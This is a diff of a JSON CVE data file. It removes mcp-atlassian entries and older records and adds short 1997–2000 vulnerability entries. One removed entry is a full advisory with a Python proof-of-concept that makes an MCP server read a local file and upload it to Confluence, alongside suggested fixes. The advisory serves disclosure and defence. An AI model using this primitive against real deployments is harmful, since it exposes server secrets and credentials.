-        "https://github.com/sooperset/mcp-atlassian/commit/b041733473f95119dd539542a43c280737a8e460",
-        "https://github.com/sooperset/mcp-atlassian/releases/tag/v0.22.0",
-        "https://github.com/advisories/GHSA-v9m3-wfh8-5646"
-      ],
-      "vulnerableProducts": [
-        "mcp-atlassian pip"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-77247",
-      "summary": "## Summary\n\nThe Jira and Confluence attachment upload tools accept caller-controlled file path parameters and read those paths from the MCP server's local filesystem before uploading the file as an Atlassian attachment.\n\nIn local `stdio` deployments, this can expose files readable by the user's MCP process. In documented HTTP/SSE or `streamable-http` deployments, the impact is higher: any MCP client that is allowed to invoke write/upload tools can cause the server process to read a server-local file and upload it to Jira or Confluence.\n\nThis is not dependent on an AI prompt injection or model behavior. It can be triggered deterministically with a normal MCP tool call.\n\n## Details\n\nThe vulnerable behavior exists because upload tool arguments are treated as server-local filesystem paths.\n\nRelevant implementation points:\n\n- `mcp_atlassian.confluence.attachments.AttachmentsMixin.upload_attachment`\n  - Accepts `file_path`.\n  - Converts the supplied value to an absolute path when needed.\n  - Checks existence with `os.path.exists`.\n  - Passes the path into the attachment upload flow.\n\n- `mcp_atlassian.confluence.attachments.AttachmentsMixin._upload_attachment_direct`\n  - Opens the supplied `file_path` with `open(file_path, \"rb\")`.\n  - Sends the resulting file object as multipart form data to Confluence.\n\n- `mcp_atlassian.confluence.attachments.AttachmentsMixin.upload_attachments`\n  - Iterates caller-supplied `file_paths`.\n  - Calls `upload_attachment` for each path.\n\n- `mcp_atlassian.jira.attachments.AttachmentsMixin.upload_attachment`\n  - Accepts `file_path`.\n  - Converts the supplied value to an absolute path when needed.\n  - Checks existence with `os.path.exists`.\n  - Opens the file and uploads it as a Jira attachment.\n\n- `mcp_atlassian.jira.attachments.AttachmentsMixin.upload_attachments`\n  - Iterates caller-supplied `file_paths`.\n  - Calls `upload_attachment` for each path.\n\n- `mcp_atlassian.servers.jira.update_issue`\n  - Accepts an `attachments` argument as a JSON array string or comma-separated string.\n  - Converts it into attachment paths and passes them into the Jira update flow.\n\nThe project also documents non-stdio deployment modes:\n\n- `sse`\n- `streamable-http`\n- multi-user authentication\n- Docker and Kubernetes deployment\n\nTherefore the upload path arguments should not be treated as if they always come from a single fully trusted local desktop user. In an HTTP or multi-user deployment, the caller and the server-local filesystem are separate security boundaries.\n\nThe core issue is that the MCP caller can choose a path, while the MCP server reads that path using the server process privileges and sends the bytes to a remote Jira or Confluence attachment endpoint.\n\nExpected behavior:\n\n- Server-local file uploads should be denied by default in HTTP/SSE or multi-user deployments, or\n- Uploads should be constrained to an explicit allowlisted upload directory after realpath resolution, and\n- Dangerous path forms such as remote UNC paths and `file://` URLs should be rejected before filesystem checks.\n\n## PoC\n\nThe following proof of concept uses a benign temporary file generated at runtime. It does not rely on prompt injection or any AI/LLM behavior. It uses a normal MCP client call against a test Confluence page controlled by the tester.\n\nPrerequisites:\n\n- A test Confluence site.\n- A test page content ID where the tester is allowed to upload attachments.\n- A test Confluence API token or another supported authentication method.\n- Python 3.10 or newer.\n\nStart `mcp-atlassian` in HTTP mode:\n\n```bash\ndocker run --rm -p 9000:9000 \\\n  -e CONFLUENCE_URL=\"https://<your-test-site>.atlassian.net/wiki\" \\\n  -e CONFLUENCE_USERNAME=\"<tester-email>\" \\\n  -e CONFLUENCE_API_TOKEN=\"<tester-api-token>\" \\\n  ghcr.io/sooperset/mcp-atlassian:latest \\\n  --transport streamable-http --host 0.0.0.0 --port 9000\n```\n\nInstall the MCP Python client:\n\n```bash\npython -m pip install \"mcp>=1.8.0\"\n```\n\nRun this standalone client script:\n\n```python\nimport asyncio\nimport os\nimport tempfile\nfrom pathlib import Path\n\nfrom mcp import ClientSession\nfrom mcp.client.streamable_http import streamablehttp_client\n\nasync def main() -> None:\n    mcp_url = os.environ.get(\"MCP_URL\", \"http://127.0.0.1:9000/mcp\")\n    content_id = os.environ[\"CONFLUENCE_CONTENT_ID\"]\n\n    proof_dir = Path(tempfile.mkdtemp(prefix=\"mcp-atlassian-proof-\"))\n    proof_file = proof_dir / \"server-local-proof.txt\"\n    proof_file.write_text(\n        \"This benign file was read from the MCP server filesystem and uploaded by an MCP tool call.\\n\",\n        encoding=\"utf-8\",\n    )\n\n    async with streamablehttp_client(mcp_url) as (read_stream, write_stream, _):\n        async with ClientSession(read_stream, write_stream) as session:\n            await session.initialize()\n            result = await session.call_tool(\n                \"confluence_upload_attachments\",\n                {\n                    \"content_id\": content_id,\n                    \"file_paths\": str(proof_file),\n                    \"comment\": \"Security test: benign server-local upload proof\",\n                    \"minor_edit\": True,\n                },\n            )\n            print(result)\n            print(f\"Uploaded test filename: {proof_file.name}\")\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n```\n\nRun it with the test page ID:\n\n```bash\nCONFLUENCE_CONTENT_ID=\"<test-page-content-id>\" python poc.py\n```\n\nObserved result:\n\n1. The MCP client sends a normal `confluence_upload_attachments` tool call.\n2. The MCP server reads the temporary file from its own filesystem.\n3. The MCP server uploads that file as an attachment to the configured Confluence page.\n4. The uploaded attachment appears on the test page.\n\nSecurity significance:\n\n- The MCP caller did not need shell access to the server.\n- The MCP caller did not need direct filesystem access to the server.\n- The MCP caller only needed permission to invoke the upload tool.\n- The file read happened with the privileges of the MCP server process.\n\nThe same class of issue applies to Jira attachment upload flows that accept caller-controlled file path parameters.\n\n## Impact\n\nThis is a server-local file disclosure and exfiltration primitive through attachment upload tools.\n\nImpacted users:\n\n- Users running `mcp-atlassian` with write/upload tools enabled.\n- Operators exposing `mcp-atlassian` through `sse` or `streamable-http`.\n- Multi-user deployments where MCP callers are not fully trusted with arbitrary read access to the MCP server filesystem.\n- Docker or Kubernetes deployments where the MCP process can read environment files, mounted secrets, service account tokens, application configuration, or shared volumes.\n\nPotential attacker:\n\n- A malicious or compromised MCP client with permission to invoke attachment upload tools.\n- A malicious user in a multi-user MCP deployment.\n- An attacker who can supply or influence MCP tool arguments through an integrated workflow.\n\nPotentially exposed data depends on the deployment, but can include files readable by the MCP server process, such as:\n\n- application configuration\n- deployment secrets\n- cloud or service credentials mounted into the runtime\n- CI/CD or automation tokens\n- other files available to the MCP server user\n\nThis issue does not require prior compromise of the internal network in deployments where the MCP service is intentionally exposed over HTTP/SSE to multiple users or external MCP clients. The attacker only needs the ability to invoke the upload tool. The server then reads the chosen path with its own process privileges and uploads it to Jira or Confluence.\n\nIf the intended security model is that every MCP caller is fully trusted with arbitrary read access to the server filesystem, that should be documented explicitly. Otherwise, server-local file path uploads should be opt-in and constrained to a configured upload root.\n\nSuggested fixes:\n\n- Default-deny server-local path uploads in HTTP/SSE and multi-user deployments.\n- Add an explicit opt-in flag for server-local upload paths.\n- Require an allowlisted upload root and enforce it after realpath resolution.\n- Reject `file://` URLs and remote UNC path forms before any filesystem operation.\n- Prefer client-provided file/resource blobs over server-local path strings for remote MCP deployments.",
-      "cvssScore": null,
+      "id": "CVE-1999-1296",
+      "summary": "Buffer overflow in Kerberos IV compatibility libraries as used in Kerberos V allows local users to gain root privileges via a long line in a kerberos configuration file, which can be specified via the KRB_CONF environmental variable.",
+      "cvssScore": 7.2,
       "severity": "High",
-      "published": "2026-09-22",
-      "modified": "2026-09-22",
-      "cwe": {
-        "cwe_id": "CWE-73",
-        "name": "External Control of File Name or Path"
-      },
-      "references": [
-        "https://github.com/sooperset/mcp-atlassian/security/advisories/GHSA-f6pj-qv47-g96w",
-        "https://github.com/sooperset/mcp-atlassian/pull/1448",
-        "https://github.com/sooperset/mcp-atlassian/commit/b041733473f95119dd539542a43c280737a8e460",
-        "https://github.com/sooperset/mcp-atlassian/releases/tag/v0.22.0",
-        "https://github.com/advisories/GHSA-f6pj-qv47-g96w"
-      ],
-      "vulnerableProducts": [
-        "mcp-atlassian pip"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-1334",
-      "summary": "Integer overflow in the ip_options_get function in the Linux kernel before 2.6.10 allows local users to cause a denial of service (kernel crash) via a cmsg_len that contains a -1, which leads to a buffer overflow.",
-      "cvssScore": 2.1,
-      "severity": "Low",
-      "published": "2004-12-15",
+      "published": "1997-04-29",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=110383108211524&w=2",
-        "http://www.guninski.com/where_do_you_want_billg_to_go_today_2.html",
-        "http://www.securityfocus.com/bid/11956",
-        "http://www.securitytrap.com/mail/full-disclosure/2004/Dec/0323.html",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/18522"
+        "http://marc.info/?l=bugtraq&m=87602167420878&w=2",
+        "http://marc.info/?l=bugtraq&m=87602167420878&w=2"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2004-1335",
-      "summary": "Memory leak in the ip_options_get function in the Linux kernel before 2.6.10 allows local users to cause a denial of service (memory consumption) by repeatedly calling the ip_cmsg_send function.",
-      "cvssScore": 2.1,
-      "severity": "Low",
-      "published": "2004-12-15",
+      "id": "CVE-1999-0040",
+      "summary": "Buffer overflow in Xt library of X Windowing System allows local users to execute commands with root privileges.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "1997-05-01",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=110383108211524&w=2",
-        "http://secunia.com/advisories/20163",
-        "http://secunia.com/advisories/20202",
-        "http://secunia.com/advisories/20338",
-        "http://www.debian.org/security/2006/dsa-1067"
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0040",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0040"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2004-0542",
-      "summary": "PHP before 4.3.7 on Win32 platforms does not properly filter all shell metacharacters, which allows local or remote attackers to execute arbitrary code, overwrite files, and access internal environment variables via (1) the \"%\", \"|\", or \">\" characters to the escapeshellcmd function, or (2) the \"%\" character to the escapeshellarg function.",
+      "id": "CVE-1999-0112",
+      "summary": "Buffer overflow in AIX dtterm program for the CDE.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "1997-05-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/878",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/878"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1116",
+      "summary": "Vulnerability in runpriv in Indigo Magic System Administration subsystem of SGI IRIX 6.3 and 6.4 allows local users to gain root privileges.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "1997-05-03",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://patches.sgi.com/support/free/security/advisories/19970503-01-PX",
+        "http://www.osvdb.org/1009",
+        "http://www.securityfocus.com/bid/462",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/2108",
+        "ftp://patches.sgi.com/support/free/security/advisories/19970503-01-PX"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1461",
+      "summary": "inpview in InPerson on IRIX 5.3 through IRIX 6.5.10 trusts the PATH environmental variable to find and execute the ttsession program, which allows local users to obtain root access by modifying the PATH to point to a Trojan horse ttsession program.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "1997-05-07",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://patches.sgi.com/support/free/security/advisories/20001101-01-I",
+        "http://marc.info/?l=bugtraq&m=87602167420921&w=2",
+        "http://www.securityfocus.com/bid/381",
+        "ftp://patches.sgi.com/support/free/security/advisories/20001101-01-I",
+        "http://marc.info/?l=bugtraq&m=87602167420921&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1286",
+      "summary": "addnetpr in SGI IRIX 6.2 and earlier allows local users to modify arbitrary files and possibly gain root access via a symlink attack on a temporary file.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "1997-05-09",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://patches.sgi.com/support/free/security/advisories/19961203-02-PX",
+        "http://marc.info/?l=bugtraq&m=87602167420927&w=2",
+        "http://www.osvdb.org/8560",
+        "http://www.securityfocus.com/bid/330",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/1433"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1158",
+      "summary": "Buffer overflow in (1) pluggable authentication module (PAM) on Solaris 2.5.1 and 2.5 and (2) unix_scheme in Solaris 2.4 and 2.3 allows local users to gain root privileges via programs that use these modules such as passwd, yppasswd, and nispasswd.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "1997-05-13",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://ftp.auscert.org.au/pub/auscert/advisory/AA-97.09.Solaris.passwd.buffer.overrun.vul",
+        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/139&type=0&nav=sec.sba",
+        "ftp://ftp.auscert.org.au/pub/auscert/advisory/AA-97.09.Solaris.passwd.buffer.overrun.vul",
+        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/139&type=0&nav=sec.sba"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0962",
+      "summary": "Buffer overflow in HPUX passwd command allows local users to gain root privileges via a command line option.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "1997-05-14",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.osvdb.org/6415",
+        "http://www1.itrc.hp.com/service/cki/docDisplay.do?docId=HPSBUX9701-045",
+        "http://www.osvdb.org/6415",
+        "http://www1.itrc.hp.com/service/cki/docDisplay.do?docId=HPSBUX9701-045"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-2146",
+      "summary": "cgitest.exe in Savant Web Server 3.1 and earlier allows remote attackers to cause a denial of service (crash) via a long HTTP request.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2002-09/0151.html",
+        "http://www.iss.net/security_center/static/10102.php",
+        "http://www.securityfocus.com/bid/5706",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-09/0151.html",
+        "http://www.iss.net/security_center/static/10102.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0719",
+      "summary": "The Guile plugin for the Gnumeric spreadsheet package allows attackers to execute arbitrary code.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "1999-08-05",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/bid/563",
+        "http://www.securityfocus.com/bid/563"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0913",
+      "summary": "dfire.cgi script in Dragon-Fire IDS allows remote users to execute commands via shell metacharacters.",
       "cvssScore": 10,
       "severity": "Critical",
-      "published": "2004-08-06",
+      "published": "1999-08-05",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.idefense.com/application/poi/display?id=108",
-        "http://www.php.net/release_4_3_7.php",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16331",
-        "http://www.idefense.com/application/poi/display?id=108",
-        "http://www.php.net/release_4_3_7.php"
+        "http://marc.info/?l=bugtraq&m=93383593909438&w=2",
+        "http://www.securityfocus.com/bid/564",
+        "http://marc.info/?l=bugtraq&m=93383593909438&w=2",
+        "http://www.securityfocus.com/bid/564"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2004-0543",
-      "summary": "Multiple SQL injection vulnerabilities in Oracle Applications 11.0 and Oracle E-Business Suite 11.5.1 through 11.5.8 allow remote attackers to execute arbitrary SQL procedures and queries.",
+      "id": "CVE-1999-0682",
+      "summary": "Microsoft Exchange 5.5 allows a remote attacker to relay email (i.e. spam) using encapsulated SMTP addresses, even if the anti-relaying features are enabled.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1999-08-06",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ237927",
+        "http://www.ciac.org/ciac/bulletins/j-056.shtml",
+        "http://www.securityfocus.com/bid/567",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/1999/ms99-027",
+        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ237927"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0727",
+      "summary": "A kernel leak in the OpenBSD kernel allows IPsec packets to be sent unencrypted.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1999-08-06",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.osvdb.org/6127",
+        "http://www.osvdb.org/6127"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1524",
+      "summary": "FlowPoint DSL router firmware versions prior to 3.0.8 allows a remote attacker to exploit a password recovery feature from the network and conduct brute force password guessing, instead of limiting the feature to the serial console port.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1999-08-07",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=93424680430460&w=2",
+        "http://marc.info/?l=bugtraq&m=93424680430460&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0673",
+      "summary": "Buffer overflow in ALMail32 POP3 client via From: or To: headers.",
+      "cvssScore": 5.1,
+      "severity": "Medium",
+      "published": "1999-08-08",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/bid/574",
+        "http://www.securityfocus.com/bid/574"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0948",
+      "summary": "GnoRPM before 0.95 allows local users to modify arbitrary files via a symlink attack.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2000-12-19",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2000-10/0043.html",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-10/0184.html",
+        "http://www.linux-mandrake.com/en/security/MDKSA-2000-055.php3?dis=7.0",
+        "http://www.redhat.com/support/errata/RHSA-2000-072.html",
+        "http://www.securityfocus.com/archive/1/136866"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0949",
+      "summary": "Heap overflow in savestr function in LBNL traceroute 1.4a5 and earlier allows a local user to execute arbitrary commands via the -g option.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2000-12-19",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2000-09/0344.html",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-09/0357.html",
+        "http://www.calderasystems.com/support/security/advisories/CSSA-2000-034.0.txt",
+        "http://www.debian.org/security/2000/20001013",
+        "http://www.linux-mandrake.com/en/security/MDKSA-2000-053.php3?dis=7.1"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0950",
+      "summary": "Format string vulnerability in x-gw in TIS Firewall Toolkit (FWTK) allows local users to execute arbitrary commands via a malformed display name.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2000-12-19",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2000-10/0376.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5420",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-10/0376.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5420"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0951",
+      "summary": "A misconfiguration in IIS 5.0 with Index Server enabled and the Index property set allows remote attackers to list directories in the web root via a Web Distributed Authoring and Versioning (WebDAV) search.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2000-12-19",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.atstake.com/research/advisories/2000/a100400-1.txt",
+        "http://www.microsoft.com/technet/support/kb.asp?ID=272079",
+        "http://www.securityfocus.com/bid/1756",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5335",
+        "http://www.atstake.com/research/advisories/2000/a100400-1.txt"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0952",
+      "summary": "global.cgi CGI program in Global 3.55 and earlier on NetBSD allows remote attackers to execute arbitrary commands via shell metacharacters.",
       "cvssScore": 10,
       "severity": "Critical",
-      "published": "2004-08-06",
+      "published": "2000-12-19",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/vulnwatch/2004-q2/0032.html",
-        "http://marc.info/?l=bugtraq&m=108638417302229&w=2",
-        "http://otn.oracle.com/deploy/security/pdf/2004alert67.pdf",
-        "http://www.ciac.org/ciac/bulletins/o-153.shtml",
-        "http://www.integrigy.com/alerts/OraAppsSQLInjection.htm"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-0367",
-      "summary": "znew in the gzip package allows local users to overwrite arbitrary files via a symlink attack on temporary files.",
-      "cvssScore": 2.1,
-      "severity": "Low",
-      "published": "2003-07-02",
-      "modified": null,
-      "cwe": "CWE-20",
-      "references": [
-        "http://www.debian.org/security/2003/dsa-308",
-        "http://www.mandriva.com/security/advisories?name=MDKSA-2003:068",
-        "http://www.openpkg.org/security/OpenPKG-SA-2003.031-gzip.html",
-        "http://www.securityfocus.com/bid/7872",
-        "http://www.turbolinux.com/security/TLSA-2003-38.txt"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0199",
-      "summary": "Directory traversal vulnerability in SEDUM HTTP Server 2.0 allows remote attackers to read arbitrary files via a .. (dot dot) attack in the HTTP GET request.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2001-05-03",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2001-02/0064.html",
-        "http://www.kb.cert.org/vuls/id/651994",
-        "http://www.osvdb.org/14797",
-        "http://www.securityfocus.com/bid/2335",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6063"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0200",
-      "summary": "HSWeb 2.0 HTTP server allows remote attackers to obtain the physical path of the server via a request to the /cgi/ directory, which will list the path if directory browsing is enabled.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2001-05-03",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2001-02/0052.html",
-        "http://www.securityfocus.com/bid/2336",
-        "http://archives.neohapsis.com/archives/bugtraq/2001-02/0052.html",
-        "http://www.securityfocus.com/bid/2336"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0202",
-      "summary": "Picserver web server allows remote attackers to read arbitrary files via a .. (dot dot) attack in an HTTP GET request.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2001-05-03",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2001-02/0073.html",
-        "http://www.securityfocus.com/bid/2339",
-        "http://archives.neohapsis.com/archives/bugtraq/2001-02/0073.html",
-        "http://www.securityfocus.com/bid/2339"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0205",
-      "summary": "Directory traversal vulnerability in AOLserver 3.2 and earlier allows remote attackers to read arbitrary files by inserting \"...\" into the requested pathname, a modified .. (dot dot) attack.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2001-05-03",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=98148759123258&w=2",
-        "http://marc.info/?l=bugtraq&m=98168216003867&w=2",
-        "http://www.securityfocus.com/bid/2343",
-        "http://marc.info/?l=bugtraq&m=98148759123258&w=2",
-        "http://marc.info/?l=bugtraq&m=98168216003867&w=2"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0213",
-      "summary": "Buffer overflow in pi program in PlanetIntra 2.5 allows remote attackers to execute arbitrary commands.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2001-05-03",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2001-01/0421.html",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6002",
-        "http://archives.neohapsis.com/archives/bugtraq/2001-01/0421.html",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6002"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0218",
-      "summary": "Format string vulnerability in mars_nwe 0.99.pl19 allows remote attackers to execute arbitrary commands.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2001-05-03",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2001-01/0456.html",
-        "http://archives.neohapsis.com/archives/freebsd/2001-02/0081.html",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6019",
-        "http://archives.neohapsis.com/archives/bugtraq/2001-01/0456.html",
-        "http://archives.neohapsis.com/archives/freebsd/2001-02/0081.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0708",
-      "summary": "Denicomp REXECD 1.05 and earlier allows a remote attacker to cause a denial of service (crash) via a long string.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2001-09-20",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/archive/1/183911",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6524",
-        "http://www.securityfocus.com/archive/1/183911",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6524"
+        "ftp://ftp.NetBSD.ORG/pub/NetBSD/misc/security/advisories/NetBSD-SA2000-014.txt.asc",
+        "http://www.osvdb.org/6486",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5424",
+        "ftp://ftp.NetBSD.ORG/pub/NetBSD/misc/security/advisories/NetBSD-SA2000-014.txt.asc",
+        "http://www.osvdb.org/6486"
       ],
       "vulnerableProducts": [],
       "isExploited": false
